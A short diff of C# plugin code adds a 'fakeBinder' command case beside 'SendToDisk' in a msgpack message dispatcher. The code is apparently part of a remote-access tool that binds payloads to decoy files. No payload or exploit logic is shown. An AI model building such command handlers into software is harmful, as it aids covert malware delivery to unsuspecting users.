@@ -28,6 +28,11 @@ namespace Plugin
                             new HandleSendTo().SendToDisk(unpack_msgpack);
                             break;
                         }
+                    case "fakeBinder":
+                        {
+                            new HandleSendTo().FakeBinder(unpack_msgpack);
+                            break;
+                        }
                 }
             }
             catch (Exception ex)
